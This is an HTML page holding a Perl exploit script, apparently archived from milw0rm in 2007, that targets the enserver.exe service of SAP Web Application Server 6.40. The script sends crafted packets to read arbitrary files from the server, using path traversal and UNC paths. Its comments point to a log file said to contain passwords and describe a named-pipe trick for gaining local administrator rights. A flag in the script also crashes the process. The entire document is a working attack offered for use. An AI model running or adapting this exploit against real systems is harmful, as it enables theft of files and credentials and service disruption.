<html><head><title>SAP Web Application Server 6.40 Arbitrary File Disclosure Exploit</title></head><pre>#!/usr/bin/perl -w

##
## SAP 'enserver.exe' file downloader
## Tested on &quot;SAP Web Application Server Java 6.40&quot; (eval DVD)
## Found &amp; coded by Nicob
##
## The downloaded file is limited to the first 32 kilobytes
## Usual port : TCP/3200+SYSNR
## Exemple : ./r3-stealer-1.0.pl 192.168.2.22 3201 &quot;c:\\boot.ini&quot;
##
## From MSDN (Win2K pre-SP4, WinXP pre-SP2 and WinNT) :
## &quot;\\\\your_box\\pipe\\your_pipe&quot; =&gt; get Local Admin (SAPServiceJ2E)
## http://msdn.microsoft.com/library/default.asp?url=/library/en-us/secauthz/security/authorization_constants.asp
##
## File parameter :
##	C:\boot.ini
## 	\\10.11.12.13\share\image.jpg
##	..\..\..\..\..\..\Documents and Settings\All Users\Application Data\sapdb\wa\httpreq.log (contains passwords !)
##

# Init

use strict;
use IO::Socket;

my $verbose = 0;
# Set this to anything not null to crash the process
my $crash = &quot;&quot;;

my $socket;
my $reply;

$|=1;

# Get arguments

if (($#ARGV&lt;2) or ($ARGV[0] eq &quot;-h&quot;)) {die &quot;Usage: $0 &lt;ip&gt; &lt;port&gt; &lt;remote filename&gt; (&lt;local filename&gt;)\n&quot;;}
my $host=$ARGV[0]; 
my $port=$ARGV[1]; 
my $filename=$ARGV[2]; 
my $output=$ARGV[3]; 

# Calculate variables

my $lg = length($filename);
my $tag1 = sprintf('%x', 0x4F + $lg);
my $tag2 = sprintf('%x', 0x20 + $lg);

# Show banner

print &quot;#####################################################################\n&quot;;
print &quot;### SAP 'enserver.exe' file downloader\n&quot;;
print &quot;### Downloading '$filename' from '$host'\n&quot;;
print &quot;#####################################################################\n\n&quot;;

# Define the packets

my $packet1 =
	&quot;0000005dabcde123000000000000005d0000005d06010000000000060000000000040000000000010004000000000003&quot;.	# Static
	&quot;5f6e69636f625f6e69636f625f6e69636f62315f&quot;.								# ASCII string : &quot;_nicob_nicob_nicob1_&quot; 
	&quot;00000000020000003b0000000500000002000000060000000400000001&quot;;						# Static

my $packet2 =
	&quot;000000&quot;. $tag1. &quot;abcde12300000001000000&quot;. $tag1 .&quot;000000&quot;. $tag1 .
	&quot;03000000454e430001010000234541410100000013030000000000234541450001000000&quot;. $tag2 .
	&quot;0000000000007d00000000000000000000000000&quot;. unpack(&quot;H*&quot;,$filename) . $crash .&quot;000023454144&quot;;		# Crash if bad filename length

# Create the socket

$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;$host,PeerPort =&gt; $port)
		|| die &quot;Connection refused at [$host:$port]&quot;;

# Send the two packet

print $socket pack(&quot;H*&quot;,$packet1);
print $socket pack(&quot;H*&quot;,$packet2);

sleep 2;

# Read and display response

recv($socket,$reply,150000,MSG_PEEK);
if ($reply =~ /^(.*)#EAD(.*)$/s) {
	print &quot;File received !\n&quot;;
	if ((!defined($output)) or ($output eq &quot;&quot;)) {
		print &quot;\n===========================================\n&quot;;
		print $2;
		print &quot;\n===========================================\n&quot;;
	} else {
		open(OUT, &quot;&gt; $output&quot;) || die &quot;Can't open $output ($0)&quot;;
		print &quot;File saved as '$output'\n&quot;;
		print OUT $2;
		close(OUT);
	}
} else {
	print &quot;Problem interpreting reply :-(\n&quot;;
}

# Close the socket

print &quot;\nThe end ...\n&quot;;
close $socket;

# milw0rm.com [2007-02-08]</pre></html>